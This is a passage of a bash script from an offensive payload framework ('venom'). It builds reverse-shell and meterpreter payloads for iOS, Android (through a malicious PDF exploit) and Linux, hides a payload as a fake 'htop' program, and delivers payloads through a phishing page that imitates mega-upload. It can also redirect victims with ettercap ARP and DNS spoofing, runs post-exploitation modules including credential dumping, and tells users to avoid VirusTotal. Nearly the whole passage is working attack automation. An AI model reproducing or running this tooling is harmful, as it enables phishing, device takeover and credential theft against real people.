sleep 2
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
rm $IPATH/output/my-release-key.Keystore > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm $ApAcHe/$N4m.apk > /dev/null 2>&1
clear
cd $IPATH/

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_android_menu
  clear
fi
}





#
# IOS payload | macho
#
sh_macho () {
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "osx/armle/shell_reverse_tcp" FALSE "osx/x64/meterpreter/reverse_tcp" FALSE "apple_ios/aarch64/meterpreter_reverse_tcp" --width 400 --height 250) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: IosPayload" --width 300) > /dev/null 2>&1

## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="IosPayload";fi

echo "[☠] Building shellcode -> MACHO format .."
# display final settings to user
cat << !

    venom settings
    ╔─────────────────────
    | LPORT   : $lport
    | LHOST   : $lhost
    | FORMAT  : MACHO -> IOS
    |_PAYLOAD : $paylo

!

# use metasploit to build shellcode (msf encoded)
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f macho > $IPATH/output/$N4m.macho"
sleep 2
echo "[☠] armle payload build (IOS)."
sleep 1
echo "[☠] Give execution permitions to agent .."
chmod +x $IPATH/output/$N4m.macho > /dev/null 2>&1


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.macho\n\nchose how to deliver: $N4m.macho" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 220) > /dev/null 2>&1


   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
        fi
      sleep 2

   else

      # edit files nedded
      echo "[☠] copy files to webroot..."
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m.macho|g" mega.html > copy.html
      mv copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m.macho $ApAcHe/$N4m.macho > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m.macho|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.macho $ApAcHe/$N4m.macho
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
           cd $IPATH/output
           # delete utf-8/non-ancii caracters from output
           tr -cd '\11\12\15\40-\176' < report.log > final.log
           sed -i "s/\[0m//g" final.log
           sed -i "s/\[1m\[34m//g" final.log
           sed -i "s/\[4m//g" final.log
           sed -i "s/\[K//g" final.log
           sed -i "s/\[1m\[31m//g" final.log
           sed -i "s/\[1m\[32m//g" final.log
           sed -i "s/\[1m\[33m//g" final.log
           mv final.log $N4m-$lhost.log > /dev/null 2>&1
           rm report.log > /dev/null 2>&1
           cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else


        echo "- ATTACK VECTOR: http://$lhost"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          fi
        fi
   fi



sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
sleep 2
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm $ApAcHe/$N4m.macho > /dev/null 2>&1
clear
cd $IPATH/

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_android_menu
  clear
fi
}




# -----------------------------
# Android PDF payload 
# ----------------------------- 
sh_android_pdf () {

# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ FILENAME ☠" --text "Enter payload output name\nexample: vacations" --width 300) > /dev/null 2>&1


## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="vacations";fi

echo "[☠] Building shellcode -> Android ARM format ..."
# display final settings to user
cat << !

    venom settings
    ╔─────────────────────
    | LPORT   : $lport
    | LHOST   : $lhost
    | FORMAT  : Android ARM -> ANDROID
    |_PAYLOAD : android/meterpreter/reverse_tcp

!

# use metasploit to build shellcode (msf encoded)
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/android/fileformat/adobe_reader_pdf_js_interface; set LHOST $lhost; set LPORT $lport; set FILENAME $N4m.pdf; exploit; exit -y'"
mv ~/.msf4/local/$N4m.pdf $IPATH/output/$N4m.pdf
sleep 2


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.pdf\n\nchose how to deliver: $N4m.pdf" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 220) > /dev/null 2>&1


   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD android/meterpreter/reverse_tcp; exploit'"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD android/meterpreter/reverse_tcp; exploit'"
        fi
      sleep 2

   else

      # edit files nedded
      echo "[☠] copy files to webroot..."
      cd $IPATH/output
      zip $N4m.zip $N4m.pdf > /dev/null 2>&1
      cd $IPATH
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m.zip|g" mega.html > copy.html
      mv copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m.zip $ApAcHe/$N4m.zip > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m.zip|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.zip $ApAcHe/$N4m.zip
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD android/meterpreter/reverse_tcp; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
           cd $IPATH/output
           # delete utf-8/non-ancii caracters from output
           tr -cd '\11\12\15\40-\176' < report.log > final.log
           sed -i "s/\[0m//g" final.log
           sed -i "s/\[1m\[34m//g" final.log
           sed -i "s/\[4m//g" final.log
           sed -i "s/\[K//g" final.log
           sed -i "s/\[1m\[31m//g" final.log
           sed -i "s/\[1m\[32m//g" final.log
           sed -i "s/\[1m\[33m//g" final.log
           mv final.log $N4m-$lhost.log > /dev/null 2>&1
           rm report.log > /dev/null 2>&1
           cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD android/meterpreter/reverse_tcp; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else


        echo "- ATTACK VECTOR: http://$lhost"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD android/meterpreter/reverse_tcp; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD android/meterpreter/reverse_tcp; exploit'"
          fi
        fi
   fi



sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
sleep 2
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
rm $IPATH/output/my-release-key.Keystore > /dev/null 2>&1
rm $IPATH/output//$N4m.zip > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm $ApAcHe/$N4m.zip > /dev/null 2>&1
clear
cd $IPATH/

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_android_menu
  clear
fi
}




#
# ELF agent (linux systems)
#
sh_elf () {
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "linux/ppc/shell_reverse_tcp" FALSE "linux/x86/shell_reverse_tcp" FALSE "linux/x86/meterpreter/reverse_tcp" FALSE "linux/x86/meterpreter_reverse_https" FALSE "linux/x64/shell/reverse_tcp" FALSE "linux/x64/shell_reverse_tcp" FALSE "linux/x64/meterpreter/reverse_tcp" FALSE "linux/x64/meterpreter/reverse_https" FALSE "linux/x64/meterpreter_reverse_https" --width 400 --height 440) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: ElfPayload" --width 300) > /dev/null 2>&1


## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="ElfPayload";fi

echo "[☠] Building shellcode -> ELF format .."
sleep 2
if [ "$paylo" = "linux/x86/meterpreter_reverse_https" ] || [ "$paylo" = "linux/x64/meterpreter_reverse_https" ]; then
   echo "[☠] meterpreter over SSL sellected ..";sleep 1
fi

# display final settings to user
cat << !

    venom settings
    ╔─────────────────────
    | LPORT   : $lport
    | LHOST   : $lhost
    | FORMAT  : ELF -> LINUX
    |_PAYLOAD : $paylo

!
sleep 1
# use metasploit to build shellcode (msf encoded)
echo "[☠] Using msfvenom to build agent .."
sleep 2
# if payload sellected its == then trigger SSL support
if [ "$paylo" = "linux/x86/meterpreter_reverse_https" ] || [ "$paylo" = "linux/x64/meterpreter_reverse_https" ]; then
   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true -f elf > $IPATH/output/$N4m.elf"
else
   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f elf > $IPATH/output/$N4m.elf"
fi

sleep 2
echo "[☠] Give execution permitions to agent .."
sleep 1
chmod +x $IPATH/output/$N4m.elf > /dev/null 2>&1


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.elf\n\nchose how to deliver: $N4m.elf" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 220) > /dev/null 2>&1


   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then

          if [ "$paylo" = "linux/x86/meterpreter_reverse_https" ] || [ "$paylo" = "linux/x64/meterpreter_reverse_https" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          fi

          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else

          if [ "$paylo" = "linux/x86/meterpreter_reverse_https" ] || [ "$paylo" = "linux/x64/meterpreter_reverse_https" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          fi
        fi
      sleep 2

   else

# post-exploitation
P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "linux_hostrecon.rc" FALSE "dump_credentials_linux.rc" FALSE "exploit_suggester.rc" --width 305 --height 260) > /dev/null 2>&1


if [ "$P0" = "linux_hostrecon.rc" ]; then
  if [ -e "$pHanTom/post/linux/gather/linux_hostrecon.rb" ]; then
    echo "[✔] linux_hostrecon.rb -> found"
    sleep 2
  else
    echo "[x] linux_hostrecon.rb -> not found"
    sleep 1
    echo "[*] copy post-module to msfdb .."
    cp $IPATH/aux/msf/linux_hostrecon.rb $pHanTom/post/linux/gather/linux_hostrecon.rb > /dev/null 2>&1
    echo "[☠] Reloading msfdb database .."
    sleep 2
    xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
    xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
  fi
fi


      # edit files nedded
      echo "[☠] copy files to webroot..."
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m.elf|g" mega.html > copy.html
      mv copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m.elf $ApAcHe/$N4m.elf > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m.elf|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.elf $ApAcHe/$N4m.elf
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then

            if [ "$paylo" = "linux/x86/meterpreter_reverse_https" ] || [ "$paylo" = "linux/x64/meterpreter_reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            fi

           cd $IPATH/output
           # delete utf-8/non-ancii caracters from output
           tr -cd '\11\12\15\40-\176' < report.log > final.log
           sed -i "s/\[0m//g" final.log
           sed -i "s/\[1m\[34m//g" final.log
           sed -i "s/\[4m//g" final.log
           sed -i "s/\[K//g" final.log
           sed -i "s/\[1m\[31m//g" final.log
           sed -i "s/\[1m\[32m//g" final.log
           sed -i "s/\[1m\[33m//g" final.log
           mv final.log $N4m-$lhost.log > /dev/null 2>&1
           rm report.log > /dev/null 2>&1
           cd $IPATH/
          else

            if [ "$paylo" = "linux/x86/meterpreter_reverse_https" ] || [ "$paylo" = "linux/x64/meterpreter_reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            fi
          fi


        else


        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then

            if [ "$paylo" = "linux/x86/meterpreter_reverse_https" ] || [ "$paylo" = "linux/x64/meterpreter_reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            fi

            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else

            if [ "$paylo" = "linux/x86/meterpreter_reverse_https" ] || [ "$paylo" = "linux/x64/meterpreter_reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            fi
          fi
        fi
   fi



sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
sleep 2
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm $ApAcHe/$N4m.elf > /dev/null 2>&1
clear
cd $IPATH/

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_unix_menu
  clear
fi
}



#
# DEBIAN agent (linux systems)
#
sh_debian () {
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "linux/ppc/shell_reverse_tcp" FALSE "linux/x86/shell_reverse_tcp" FALSE "linux/x86/meterpreter/reverse_tcp" FALSE "linux/x64/shell/reverse_tcp" FALSE "linux/x64/shell_reverse_tcp" FALSE "linux/x64/meterpreter/reverse_tcp" --width 400 --height 300) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ LOGFILE NAME ☠" --text "Enter logfile output name\nexample: DebMasquerade" --width 300) > /dev/null 2>&1


## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="DebMasquerade";fi

echo "[☠] Building shellcode -> C format .."
sleep 2
# display final settings to user
cat << !

    venom settings
    ╔─────────────────────
    | LPORT   : $lport
    | LHOST   : $lhost
    | FORMAT  : C -> LINUX
    |_PAYLOAD : $paylo

!
sleep 1
# use metasploit to build shellcode (msf encoded)
echo "[☠] Using msfvenom to build raw shellcode .."
sleep 2
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f c -o $IPATH/output/chars.raw"


echo "[☠] Parsing shellcode data .."
sleep 1
parse=$(cat $IPATH/output/chars.raw | grep -v "=" | tr -d '";' | tr -d '\n' | tr -d ' ')
echo ""
echo "unsigned char buf[] ="
echo "$parse"



# ----------------
# BUILD C PROGRAM
# ----------------
cd $IPATH/output
echo "#include<stdio.h>" > htop.c
echo "#include<stdlib.h>" >> htop.c
echo "#include<string.h>" >> htop.c
